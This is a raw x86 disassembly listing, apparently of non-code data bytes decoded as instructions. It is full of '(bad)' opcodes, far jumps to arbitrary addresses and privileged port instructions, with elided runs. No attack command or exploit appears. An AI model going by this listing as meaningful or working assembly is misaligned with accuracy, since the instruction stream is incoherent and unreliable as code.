  42b5ac:	cmp    esi,DWORD PTR [esp+edi*1+0x72]
  42b5b0:	xchg   ebp,eax
  42b5b1:	sti    
  42b5b2:	adc    al,0x6b
  42b5b4:	and    ecx,DWORD PTR [esp+esi*4-0x63]
  42b5b8:	test   BYTE PTR [esi+0x1c762f7d],bl
  42b5be:	es call 0x8289:0xa8760eae
  42b5c6:	scas   eax,DWORD PTR es:[edi]
  42b5c7:	cmp    esi,edx
  42b5c9:	sbb    DWORD PTR [esi+ecx*8],esp
  42b5cc:	and    eax,0x753b4b5c
  42b5d1:	rol    DWORD PTR [esi],1
  42b5d3:	jbe    0x42b5e2
  42b5d5:	lds    ebp,FWORD PTR [ebx]
  42b5d7:	scas   eax,DWORD PTR es:[edi]
  42b5d8:	xchg   esp,eax
  42b5d9:	pop    edx
  42b5da:	jmp    0x42b5c4
  42b5dc:	pop    es
  42b5dd:	shl    DWORD PTR [esi+0x77],cl
  42b5e0:	into   
  42b5e1:	add    ebp,0x6f
  42b5e4:	cmc    
  42b5e5:	pop    ebp
  42b5e6:	mov    dl,0xf2
  42b5e8:	push   0xc4f68fb5
  42b5ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	test   eax,0x67f87ab6
  42b667:	rol    DWORD PTR [ecx],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [eax-0xc],dl
  42b670:	adc    eax,0x4e02cdae
  42b675:	scas   al,BYTE PTR es:[edi]
  42b676:	pop    ebp
  42b677:	in     al,dx
  42b678:	mov    ebx,0x3f6c8e3
  42b67d:	xor    eax,0x4b291039
  42b682:	push   ebp
  42b683:	(bad)  
  42b684:	xor    cl,bl
  42b686:	jmp    0x4e49c322
  42b68b:	(bad)  
  42b68d:	pop    ebp
  42b68e:	push   ds
  42b68f:	inc    eax
  42b690:	mov    bl,0xea
  42b692:	or     BYTE PTR [eax+0x430a1edd],dl
  42b698:	push   edx
  42b699:	mov    ds:0xf953bd1d,eax
  42b69e:	(bad)  [ebp-0x42]
  42b6a1:	cmp    edi,0xffffffe2
  42b6a4:	add    BYTE PTR [ecx+0xc24cadb],dl
  42b6aa:	jl     0x42b659
  42b6ac:	inc    ebx
  42b6ad:	pop    ss
  42b6ae:	je     0x42b70f
  42b6b0:	mov    al,0x42
  42b6b2:	int3   
  42b6b3:	fld    TBYTE PTR [ecx-0x76]
  42b6b6:	jmp    0xd655:0x6082370c
  42b6bd:	adc    al,0xe6
  42b6bf:	jge    0x42b71f
  42b6c1:	enter  0xc26c,0x72
  42b6c5:	jb     0x42b650
  42b6c7:	ficomp WORD PTR [ebx]
  42b6c9:	push   edx
  42b6ca:	es push esp
  42b6cc:	mov    al,0xca
  42b6ce:	mov    ss,WORD PTR [edi]
  42b6d0:	xor    eax,ebp
  42b6d2:	pop    es
  42b6d3:	nop
  42b6d4:	jmp    0xc5ee:0xeef13a4e
  42b6db:	test   al,0x9b
  42b6dd:	mov    ebp,0x7acf931d
  42b6e2:	jp     0x42b735
  42b6e4:	ins    BYTE PTR es:[edi],dx
  42b6e5:	mov    eax,0x3b14be4b
  42b6ea:	je     0x42b66c
  42b6ec:	pop    esp
  42b6ed:	mov    ds:0xf4a58c49,al
  42b6f2:	stos   DWORD PTR es:[edi],eax
  42b6f3:	xlat   BYTE PTR ds:[ebx]
  42b6f4:	mov    eax,ds:0xdbf2c357
  42b6f9:	scas   eax,DWORD PTR es:[edi]
  42b6fa:	mov    eax,ds:0xa10a071d
  42b6ff:	push   es
  42b700:	add    DWORD PTR [eax+0x496ef4cb],esp
  42b706:	mov    edi,0xf963af94
  42b70b:	cmp    BYTE PTR [eax+0x392a611a],0xf
  42b712:	add    al,0xd1
  42b714:	lods   al,BYTE PTR ds:[esi]
  42b715:	push   esi
  42b716:	cmp    ebx,esp
  42b718:	push   es
  42b719:	bound  ecx,QWORD PTR [edx]
  42b71b:	mov    eax,ds:0x2a478de2
  42b720:	div    BYTE PTR [edx+eiz*1-0x8fb463c]
  42b727:	out    dx,al
  42b728:	cdq    
  42b729:	add    cl,BYTE PTR [esi-0x46]
  42b72c:	and    cl,bl
  42b72e:	ins    DWORD PTR es:[edi],dx
  42b72f:	push   ecx
  42b730:	sbb    al,dl
  42b732:	int3   
  42b733:	shl    DWORD PTR [ebp+0x72daba90],1
  42b739:	xchg   edi,eax
  42b73a:	cld    
  42b73b:	leave  
  42b73c:	in     al,0x32
  42b73e:	in     al,dx
  42b73f:	sahf   
  42b740:	xor    DWORD PTR [ebx],ebp
  42b742:	dec    ebx
  42b743:	lock jns 0x42b71d
  42b746:	and    al,BYTE PTR [ebx-0x2399908c]
  42b74c:	outs   dx,DWORD PTR ds:[esi]
  42b74d:	push   0xa1b004f6
  42b752:	lods   al,BYTE PTR ds:[esi]
  42b753:	inc    ebp
  42b754:	add    BYTE PTR [edi-0x763a5414],bh
  42b75a:	push   eax
  42b75b:	add    DWORD PTR [eax+0x5b],esp
  42b75e:	jns    0x42b71e
  42b760:	jge    0x42b735
  42b762:	sar    BYTE PTR [ebp+0x4f],cl
  42b765:	mov    dl,0x45
  42b767:	mov    eax,0x63a0026d
  42b76c:	inc    ecx
  42b76d:	sub    al,BYTE PTR [eax]
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	mov    dh,al
  42b7e4:	test   BYTE PTR [bx-0x2e],ah
  42b7e8:	add    DWORD PTR [eax],eax
  42b7ea:	add    BYTE PTR [ecx],al
  42b7ec:	add    BYTE PTR [eax],al
  42b7ee:	cmp    BYTE PTR [ebx+0x3a],ah
  42b7f1:	cmp    eax,0x9c504cba
  42b7f6:	pop    eax
  42b7f7:	and    edx,DWORD PTR [esi]
  42b7f9:	dec    esi
  42b7fa:	inc    ebp
  42b7fb:	test   eax,0xc30dad62
  42b800:	dec    ebx
  42b801:	inc    eax
  42b802:	fdivr  DWORD PTR [esi-0x2febee7d]
  42b808:	sbb    eax,0x25190c4
  42b80d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b80e:	in     al,0x66
  42b810:	jmp    0x9451b6f4
  42b815:	in     al,0x43
  42b817:	out    0x8,al
  42b819:	clc    
  42b81a:	leave  
  42b81b:	fs mov edi,0xde18764c
  42b821:	push   ss
  42b822:	leave  
  42b823:	dec    eax
  42b825:	mov    ebx,0xd575acd1
  42b82a:	aas    
  42b82b:	xor    eax,0x1be4cfb7
  42b830:	lea    esp,[eax+0x2a]
  42b833:	mov    ds:0xb5c61d2c,eax
  42b838:	xchg   ebx,eax
  42b839:	enter  0x59f3,0x54
  42b83d:	je     0x42b7d1
  42b83f:	cmc    
  42b840:	push   ds
  42b841:	dec    esp
  42b842:	inc    edx
  42b843:	inc    esi
  42b844:	stos   BYTE PTR es:[edi],al
  42b845:	or     bh,bh
  42b847:	aam    0x41
  42b849:	retf   
  42b84a:	inc    esi
  42b84b:	aam    0xc1
  42b84d:	fdivr  st(3),st
  42b84f:	call   0xab1c:0xa2d34a19
  42b856:	inc    esi
  42b857:	mov    esi,0xcbbe1726
  42b85c:	sbb    al,0x89
  42b85e:	xchg   ebp,eax
  42b85f:	shl    esp,cl
  42b861:	push   0xffffffbe
  42b863:	pop    ecx
  42b864:	and    al,0xce
  42b866:	jg     0x42b862
  42b868:	xor    BYTE PTR [esi+0x7f],ah
  42b86b:	mov    ecx,0xf2443585
  42b870:	outs   dx,BYTE PTR ds:[esi]
  42b871:	aaa    
  42b872:	jecxz  0x42b863
  42b874:	bound  edi,QWORD PTR [esi]
  42b876:	pop    eax
  42b877:	jne    0x42b811
  42b879:	xor    eax,0x7a872d25
  42b87e:	lods   al,BYTE PTR ss:[si]
  42b881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b882:	pushf  
  42b883:	push   cs
  42b884:	and    ch,dh
  42b886:	retf   0xcd24
  42b889:	iret   
  42b88a:	popf   
  42b88b:	ret    0x955a
  42b88e:	mov    dl,0x2
  42b890:	mov    dl,0xd3
  42b892:	sbb    DWORD PTR [ebx+esi*1+0x760df6c4],0x11
  42b89a:	icebp  
  42b89b:	repnz out dx,eax
  42b89d:	dec    edx
  42b89e:	add    eax,eax
  42b8a0:	jbe    0x42b8e9
  42b8a2:	fwait
  42b8a3:	adc    DWORD PTR [ebx+eax*2],ebp
  42b8a6:	imul   ecx,eax,0x66
  42b8a9:	cdq    
  42b8aa:	xchg   DWORD PTR [esi+ecx*2],ebx
  42b8ad:	cmp    BYTE PTR [edi+0x2d],ch
  42b8b0:	lea    edx,[ecx-0x36f52ab6]
  42b8b6:	xchg   ecx,eax
  42b8b7:	inc    edi
  42b8b8:	mov    WORD PTR [eax+0x52],ss
  42b8bb:	push   edi
  42b8bc:	imul   edi,DWORD PTR [ebx-0x25da5641],0x46
  42b8c3:	mov    esi,0x8ad1f5d7
  42b8c8:	add    al,0x91
  42b8ca:	dec    esp
  42b8cb:	outs   dx,BYTE PTR ds:[esi]
  42b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b8cd:	push   esi
  42b8ce:	ins    DWORD PTR es:[edi],dx
  42b8cf:	ins    DWORD PTR es:[edi],dx
  42b8d0:	adc    eax,0xe3c8346a
  42b8d5:	cdq    
  42b8d6:	cmp    BYTE PTR [ebx-0x4b],0x71
  42b8da:	push   ss
  42b8db:	popa   
  42b8dc:	jle    0x42b954
  42b8de:	inc    eax
  42b8df:	add    ecx,eax
  42b8e1:	ins    BYTE PTR es:[edi],dx
  42b8e2:	mov    dh,0xae
  42b8e4:	xchg   ebp,eax
  42b8e5:	fld    DWORD PTR [ebx+0x503d7fe1]
  42b8eb:	aaa    
  42b8ec:	pop    ss
  42b8ed:	fiadd  DWORD PTR [eax]
	...
  42b953:	add    BYTE PTR [eax],al
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     edi,edx
  42b963:	xor    WORD PTR [edi],di
  42b966:	rol    DWORD PTR [bx+di],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    cl,dh
  42b96f:	daa    
  42b970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b971:	cmp    dh,BYTE PTR es:[edi-0x7b]
  42b975:	test   DWORD PTR [edi],esp
  42b977:	inc    edx
  42b978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b979:	sub    eax,0x3c53bb12
  42b97e:	shl    ebx,1
  42b980:	inc    esi
  42b981:	sbb    BYTE PTR [ecx+ecx*1-0x481cd36b],bh
  42b988:	shr    DWORD PTR [ebp+ecx*4+0xed4c3b0],1
  42b98f:	jmp    0x42b975
  42b991:	mov    ebp,0x9aa8da20
  42b996:	sti    
  42b997:	jmp    0x42b9c2
  42b999:	push   cs
  42b99a:	aaa    
  42b99b:	inc    edx
  42b99c:	mov    eax,0x68778e9f
  42b9a1:	sub    DWORD PTR [esp+edx*2],eax
  42b9a4:	mov    gs,WORD PTR [esi]
  42b9a6:	lods   al,BYTE PTR ds:[esi]
  42b9a7:	lods   al,BYTE PTR ds:[esi]
  42b9a8:	sub    esi,edi
  42b9aa:	inc    edi
  42b9ab:	mov    bl,al
  42b9ad:	dec    esp
  42b9ae:	stc    
  42b9af:	retf   0xc6f6
  42b9b2:	test   DWORD PTR [edi],0x7f6765ba
  42b9b8:	jmp    0x63bfc369
  42b9bd:	dec    esp
  42b9be:	pop    edi
  42b9bf:	ja     0x42b9bf
  42b9c1:	out    dx,al
  42b9c2:	rcl    dh,1
  42b9c4:	test   al,0x67
  42b9c6:	or     esi,ecx
  42b9c8:	inc    ebx
  42b9c9:	pushf  
  42b9ca:	not    DWORD PTR [edx]
  42b9cc:	cmp    eax,0x2f8f3b09
  42b9d1:	jecxz  0x42ba4d
  42b9d3:	iret   
  42b9d4:	pushf  
  42b9d5:	mov    ch,0xcc
  42b9d7:	mov    BYTE PTR [edi-0x7a],0xba
  42b9db:	push   0x18
  42b9dd:	les    edx,FWORD PTR [ebx]
  42b9df:	out    0x22,al
  42b9e1:	xchg   edx,eax
  42b9e2:	mov    bl,0x74
  42b9e4:	test   ebx,edx
  42b9e6:	inc    esp
  42b9e7:	shl    dl,cl
  42b9e9:	sbb    DWORD PTR ds:0xf40639f5,ebp
  42b9ef:	fmul   st(1),st
  42b9f1:	cli    
  42b9f2:	jge    0x42b9f6
  42b9f4:	scas   eax,DWORD PTR es:[edi]
  42b9f5:	push   DWORD PTR [ecx-0x29]
  42b9f8:	int    0x44
  42b9fa:	dec    esp
  42b9fb:	aam    0xd
  42b9fd:	jp     0x42b9ee
  42b9ff:	(bad)  
  42ba00:	cmp    al,0x7c
  42ba02:	xlat   BYTE PTR ds:[ebx]
  42ba03:	adc    al,dl
  42ba05:	mov    ebx,0x3b6a4a6
  42ba0a:	mov    edi,0xee5ed416
  42ba0f:	cmp    cl,cl
  42ba11:	xlat   BYTE PTR ds:[ebx]
  42ba12:	or     BYTE PTR [edx],cl
  42ba14:	outs   dx,DWORD PTR ds:[esi]
  42ba15:	ss das 
  42ba17:	pushf  
  42ba18:	fld    DWORD PTR [ebx-0x35]
  42ba1b:	pop    ecx
  42ba1c:	es xor esp,edi
  42ba1f:	inc    esi
  42ba20:	stc    
  42ba21:	add    DWORD PTR [ebx+0x35],edx
  42ba24:	mov    ch,BYTE PTR [ecx+0x57]
  42ba27:	loop   0x42b9f0
  42ba29:	(bad)  
  42ba2a:	lods   al,BYTE PTR ds:[esi]
  42ba2b:	out    0x96,eax
  42ba2d:	int3   
  42ba2e:	xchg   ebp,eax
  42ba2f:	push   ecx
  42ba30:	fcmovbe st,st(7)
  42ba32:	lea    ecx,[eax+0x6c404802]
  42ba38:	and    eax,0x5d935047
  42ba3d:	outs   dx,DWORD PTR ds:[esi]
  42ba3e:	icebp  
  42ba3f:	or     al,0x32
  42ba41:	lea    ebp,ds:0x67b8c367
  42ba47:	dec    ebp
  42ba48:	test   DWORD PTR [ebp+esi*1-0x5c],edx
  42ba4c:	neg    BYTE PTR [edi+0x23]
  42ba4f:	or     al,0xb9
  42ba51:	and    edi,esi
  42ba53:	stos   DWORD PTR es:[edi],eax
  42ba54:	push   ecx
  42ba55:	leave  
  42ba56:	sub    eax,DWORD PTR [eax]
  42ba58:	retf   0xb479
  42ba5b:	push   eax
  42ba5c:	jg     0x42ba3e
  42ba5e:	mov    dl,BYTE PTR [edx]
  42ba60:	lahf   
  42ba61:	mov    ds:0xce35a84a,eax
  42ba66:	sbb    cl,BYTE PTR [ecx-0x26f19aea]
  42ba6c:	daa    
  42ba6d:	dec    ebp
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [eax+0x6d],ebx
  42bae4:	mov    WORD PTR [ebp+0x1d467],ds
  42baea:	add    BYTE PTR [ecx],al
  42baec:	add    BYTE PTR [eax],al
  42baee:	sbb    ah,dh
  42baf0:	xor    eax,0xb6f9ec0c
  42baf5:	dec    edi
  42baf6:	(bad)  
  42baf7:	shl    dl,cl
  42baf9:	inc    ebx
  42bafa:	gs adc al,0x76
  42bafd:	mov    cl,0xf0
  42baff:	fs jmp 0xd4e13625
  42bb05:	fmul   QWORD PTR [ebp+esi*8-0x848e5c8]
  42bb0c:	pop    esp
  42bb0d:	fcmovbe st,st(5)
  42bb0f:	jecxz  0x42bb08
  42bb11:	nop
  42bb12:	sub    ecx,DWORD PTR [ecx]
  42bb14:	std    
  42bb15:	push   edi
  42bb16:	mov    ecx,0x8ad2df7d
  42bb1b:	in     al,0x92
  42bb1d:	fnstenv [edx]
  42bb1f:	dec    edx
  42bb20:	inc    ecx
  42bb21:	sub    al,ah
  42bb23:	sub    BYTE PTR [edx],bh
  42bb25:	pop    esi
  42bb26:	jecxz  0x42bb82
  42bb28:	stos   BYTE PTR es:[edi],al
  42bb29:	dec    ebx
  42bb2a:	dec    eax
  42bb2b:	or     al,0xef
  42bb2d:	push   0x7a
  42bb2f:	inc    ebx
  42bb30:	loopne 0x42bb10
  42bb32:	push   eax
  42bb33:	popa   
  42bb34:	ins    BYTE PTR es:[edi],dx
  42bb35:	test   eax,0x5d88a088
  42bb3a:	xor    cl,BYTE PTR [ebp+0x69c67b3a]
  42bb40:	or     eax,0x8d9222fe
  42bb45:	imul   ecx,DWORD PTR [eax+0x76940a29],0x92547abb
  42bb4f:	push   ds
  42bb50:	scas   eax,DWORD PTR es:[edi]
  42bb51:	hlt    
  42bb52:	ins    DWORD PTR es:[edi],dx
  42bb53:	int3   
  42bb54:	ja     0x42bb1f
  42bb56:	call   0x7c8d68af
  42bb5b:	xor    eax,DWORD PTR [esi]
  42bb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb5e:	ret    
  42bb5f:	ins    BYTE PTR es:[edi],dx
  42bb60:	dec    edi
  42bb61:	and    ecx,DWORD PTR [edx+0x4601868e]
  42bb67:	sbb    esp,ebx
  42bb69:	xor    eax,0x40f9faad
  42bb6e:	mov    ecx,DWORD PTR [ebx+0x2307857a]
  42bb74:	inc    eax
  42bb75:	sbb    BYTE PTR [ebp-0x45],dl
  42bb78:	and    DWORD PTR [ecx],edi
  42bb7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb7b:	sar    DWORD PTR [eax+0x3e],0xa1
  42bb7f:	push   esp
  42bb80:	dec    ebp
  42bb81:	(bad)  
  42bb83:	stos   DWORD PTR es:[edi],eax
  42bb84:	aam    0xa3
  42bb86:	dec    edi
  42bb87:	mov    eax,ds:0xbff44468
  42bb8c:	add    eax,0xcb7f697e
  42bb91:	xor    eax,0x8dd095ad
  42bb96:	jb     0x42bb56
  42bb98:	out    dx,al
  42bb99:	in     al,dx
  42bb9a:	mov    eax,fs:0x14ab88d6
  42bba0:	int3   
  42bba1:	sti    
  42bba2:	jno    0x42bbeb
  42bba4:	cmp    al,0x11
  42bba6:	fld    QWORD PTR [esi+eiz*4+0x22e7cb1d]
  42bbad:	cwde   
  42bbae:	adc    al,BYTE PTR [ecx+edi*1]
  42bbb1:	or     cl,dh
  42bbb3:	xor    al,BYTE PTR [edx-0x2bb87f22]
  42bbb9:	std    
  42bbba:	mov    al,0xd3
  42bbbc:	sbb    ah,al
  42bbbe:	push   esp
  42bbbf:	sbb    al,0x81
  42bbc1:	adc    eax,0xe354d418
  42bbc6:	mov    bh,0x79
  42bbc8:	mov    esp,0x76d81543
  42bbcd:	lods   al,BYTE PTR ds:[esi]
  42bbce:	fistp  DWORD PTR [ebx*2+0x32b902c1]
  42bbd5:	repz sahf 
  42bbd7:	movhps QWORD PTR [ebx],xmm0
  42bbda:	lahf   
  42bbdb:	popa   
  42bbdc:	int3   
  42bbdd:	sbb    esp,edi
  42bbdf:	iret   
  42bbe0:	fisttp WORD PTR [edx-0x48]
  42bbe3:	clc    
  42bbe4:	mov    ch,0xf6
  42bbe6:	mov    ch,0x9d
  42bbe8:	or     cl,cl
  42bbea:	sub    esi,esi
  42bbec:	addr16 push ebx
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	dec    ecx
  42bc63:	push   es
  42bc64:	gs jp  0x42bcce
  42bc67:	aad    0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    BYTE PTR [edi-0x64955b17],dl
  42bc73:	in     eax,0xf9
  42bc75:	mov    bh,0x78
  42bc77:	das    
  42bc78:	sub    DWORD PTR [esi],esp
  42bc7a:	out    0x7c,eax
  42bc7c:	push   0x9b953d71
  42bc81:	add    ebx,DWORD PTR [ebp-0x1c]
  42bc84:	adc    BYTE PTR [eax],al
  42bc86:	shr    BYTE PTR [ecx+0x59],1
  42bc89:	inc    ebx
  42bc8a:	sub    DWORD PTR [ebx],edi
  42bc8c:	dec    edx
  42bc8d:	aaa    
  42bc8e:	lods   eax,DWORD PTR ds:[esi]
  42bc8f:	dec    esi
  42bc90:	mov    ebp,ebx
  42bc92:	ror    DWORD PTR [edx],1
  42bc94:	xlat   BYTE PTR ds:[ebx]
  42bc95:	loopne 0x42bc7f
  42bc97:	inc    edx
  42bc98:	jo     0x42bc52
  42bc9a:	inc    ebx
  42bc9b:	mov    WORD PTR [ebx+0x44],ss
  42bc9e:	push   ds
  42bc9f:	push   es
  42bca0:	cmp    bh,cl
  42bca2:	loope  0x42bc67
  42bca4:	sub    dl,0xf4
  42bca7:	rol    DWORD PTR [ebx],0xd8
  42bcaa:	jmp    0x3aed:0x31729e7c
  42bcb1:	push   0xffffff86
  42bcb3:	repnz pop ecx
  42bcb5:	adc    al,0x76
  42bcb7:	or     al,0xef
  42bcb9:	mov    ch,0x96
  42bcbb:	mov    bh,0x46
  42bcbd:	jnp    0x42bd04
  42bcbf:	(bad)  
  42bcc0:	js     0x42bd11
  42bcc2:	mov    edx,0x41fa36d9
  42bcc7:	outs   dx,BYTE PTR ds:[esi]
  42bcc8:	mov    bh,0x19
  42bcca:	aas    
  42bccb:	push   ds
  42bccc:	lahf   
  42bccd:	in     eax,0xf9
  42bccf:	or     al,0x41
  42bcd1:	sbb    cl,BYTE PTR [ebp-0x58579f07]
  42bcd7:	pop    esi
  42bcd8:	mov    edi,0x23b18fad
  42bcdd:	dec    edi
  42bcde:	mov    ds:0x36346f1,al
  42bce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bce4:	push   edx
  42bce5:	inc    BYTE PTR [edi-0x1b]
  42bce8:	adc    eax,ecx
  42bcea:	dec    ebp
  42bceb:	outs   dx,DWORD PTR ds:[esi]
  42bcec:	ds pop es
  42bcee:	imul   edi,DWORD PTR [esi-0x33],0xd
  42bcf2:	inc    ebx
  42bcf3:	or     esi,DWORD PTR [edx]
  42bcf5:	pop    edx
  42bcf6:	mov    DWORD PTR [edi],esp
  42bcf8:	cld    
  42bcf9:	test   dh,dh
  42bcfb:	pop    esi
  42bcfc:	inc    edx
  42bcfd:	inc    eax
  42bcfe:	push   ebx
  42bcff:	(bad)
  42bd02:	lods   eax,DWORD PTR ds:[esi]
  42bd03:	in     al,dx
  42bd04:	jg     0x42bd22
  42bd06:	hlt    
  42bd07:	bound  edi,QWORD PTR [ebx]
  42bd09:	jmp    0xa1cf3b0e
  42bd0e:	xor    edi,DWORD PTR [ebx]
  42bd10:	arpl   WORD PTR [ebx+0x22f9e489],sp
  42bd16:	xor    al,0x96
  42bd18:	aas    
  42bd19:	mov    esi,0x819f2cae
  42bd1e:	push   cs
  42bd1f:	nop
  42bd20:	outs   dx,DWORD PTR ds:[esi]
  42bd21:	test   al,0x18
  42bd23:	jg     0x42bd50
  42bd25:	sbb    esp,edx
  42bd27:	(bad)
  42bd2b:	or     BYTE PTR [esi+0x535d967e],al
  42bd31:	jo     0x42bce2
  42bd33:	sub    al,0x67
  42bd35:	jle    0x42bd15
  42bd37:	or     ah,BYTE PTR [esi]
  42bd39:	loope  0x42bcda
  42bd3b:	(bad)  
  42bd3c:	stos   BYTE PTR es:[edi],al
  42bd3d:	inc    ecx
  42bd3e:	jae    0x42bd10
  42bd40:	cwde   
  42bd41:	push   ecx
  42bd42:	push   0xffffffb0
  42bd44:	mov    al,ds:0xcf6ad501
  42bd49:	int3   
  42bd4a:	cmp    DWORD PTR [edi+0x74],ebp
  42bd4d:	and    al,0x3c
  42bd4f:	stc    
  42bd50:	inc    esi
  42bd51:	pop    ebp
  42bd52:	adc    esp,DWORD PTR [ebx+0x5047563d]
  42bd58:	inc    edx
  42bd59:	pop    ss
  42bd5a:	mov    bl,bl
  42bd5c:	in     al,0xdd
  42bd5e:	inc    ebx
  42bd5f:	jge    0x42bd19
  42bd61:	push   ds
  42bd62:	out    dx,al
  42bd63:	mov    al,0x1d
  42bd65:	sub    DWORD PTR [ecx+0x1b],edi
  42bd68:	sub    al,0x70
  42bd6a:	sub    DWORD PTR [ecx-0x24],eax
  42bd6d:	push   esi
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bd88
  42bde3:	mov    WORD PTR [eax],?
  42bde5:	and    BYTE PTR [edi-0x2a],0x1
  42bde9:	add    BYTE PTR [eax],al
  42bdeb:	add    DWORD PTR [eax],eax
  42bded:	add    BYTE PTR [edx+0x6a],al
  42bdf0:	jmp    0x6f1561ba
  42bdf5:	pop    esp
  42bdf6:	add    bl,0x65
  42bdf9:	jp     0x42bdce
  42bdfb:	mov    ds:0xfd7f27,al
  42be00:	popf   
  42be01:	jnp    0x42be4a
  42be03:	sub    al,0x9b
  42be05:	jecxz  0x42be7f
  42be07:	iret   
  42be08:	or     BYTE PTR [ecx],cl
  42be0a:	pop    es
  42be0b:	outs   dx,BYTE PTR ds:[esi]
  42be0c:	or     dl,cl
  42be0e:	nop
  42be0f:	out    0xf4,al
  42be11:	pop    ebp
  42be12:	mov    edi,0x3d31165
  42be17:	inc    edi
  42be18:	push   esp
  42be19:	pusha  
  42be1a:	push   edi
  42be1b:	fs mov ebp,0x5ce7d798
  42be21:	adc    bh,dl
  42be23:	push   esp
  42be24:	aaa    
  42be25:	dec    esi
  42be26:	fcomip st,st(6)
  42be28:	(bad)  
  42be2a:	xor    cl,0x99
  42be2d:	fstp   TBYTE PTR [edi+0x68]
  42be30:	pop    eax
  42be31:	xchg   esi,eax
  42be32:	xor    BYTE PTR [ebx+0x3fc9c96f],0xd
  42be39:	mov    eax,0x7124b5b2
  42be3e:	mov    DWORD PTR [edi+0x2f],esp
  42be41:	xchg   ebx,eax
  42be42:	loopne 0x42bdf1
  42be44:	sub    BYTE PTR [edx],bl
  42be46:	test   al,0xfa
  42be48:	push   esp
  42be49:	stc    
  42be4a:	aas    
  42be4b:	cmp    bh,BYTE PTR [eax]
  42be4d:	and    BYTE PTR [edx-0x70],0x5d
  42be51:	jno    0x42bdda
  42be53:	xchg   ecx,eax
  42be54:	ret    
  42be55:	xchg   ebp,eax
  42be56:	fdivr  DWORD PTR [ebp+0x68]
  42be59:	unpcklps xmm1,XMMWORD PTR [esi]
  42be5c:	(bad)  
  42be5d:	cld    
  42be5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be5f:	push   ecx
  42be60:	lock push ebx
  42be62:	mov    edi,ebp
  42be64:	cli    
  42be65:	pop    ebp
  42be66:	enter  0xe7f6,0x67
  42be6a:	sub    bl,BYTE PTR [ebx-0x1d2021fb]
  42be70:	add    al,0x8f
  42be72:	xchg   DWORD PTR [edi],edx
  42be74:	sub    cl,BYTE PTR [esi-0x3c]
  42be77:	inc    esp
  42be78:	sbb    eax,0x6136dfb9
  42be7d:	jg     0x42becd
  42be7f:	push   esi
  42be80:	pushf  
  42be81:	xor    al,0x38
  42be83:	pushf  
  42be84:	xchg   ebp,eax
  42be85:	ss jno 0x42bef3
  42be88:	pop    ecx
  42be89:	sub    DWORD PTR [esi+ebp*2],esp
  42be8c:	jge    0x42beb4
  42be8e:	sub    eax,0x1c58ac74
  42be93:	leave  
  42be94:	push   ds
  42be95:	sub    eax,0xfa1ccf5
  42be9a:	mov    DWORD PTR ds:0xda40ed9b,ecx
  42bea0:	scas   eax,DWORD PTR es:[edi]
  42bea1:	xor    eax,DWORD PTR [eax+0x33]
  42bea4:	in     al,dx
  42bea5:	ins    DWORD PTR es:[edi],dx
  42bea6:	xor    ah,BYTE PTR [ebx-0x53e6de3b]
  42beac:	add    dh,al
  42beae:	and    BYTE PTR [edi],ah
  42beb0:	xor    eax,0x60c9cd00
  42beb5:	ss jmp 0xa92215e8
  42bebb:	and    DWORD PTR [esi-0x48],ebp
  42bebe:	loopne 0x42bec6
  42bec0:	retf   
  42bec1:	jmp    0x6bf9504e
  42bec6:	adc    DWORD PTR [ebx-0x54b91e6],ecx
  42becc:	mov    cl,BYTE PTR [edx]
  42bece:	cwde   
  42becf:	vpunpckhbw ymm4,ymm4,YMMWORD PTR [edx-0x1a]
  42bed4:	inc    edi
  42bed5:	fisttp WORD PTR [edx-0xc1a22fb]
  42bedb:	cwde   
  42bedc:	adc    BYTE PTR [eax],0x3
  42bedf:	bound  esi,QWORD PTR [ebx]
  42bee1:	fadd   st(5),st
  42bee3:	cmp    eax,0x89fbef6
  42bee8:	in     eax,dx
  42bee9:	stos   DWORD PTR es:[edi],eax
  42beea:	aas    
  42beeb:	xor    dh,BYTE PTR [ecx+0x3b]
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0x697bd7c8,eax
  42bf63:	xchg   esi,esi
  42bf65:	and    eax,0x1d767
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	rcl    dh,1
  42bf70:	sar    DWORD PTR [esi],0xe8
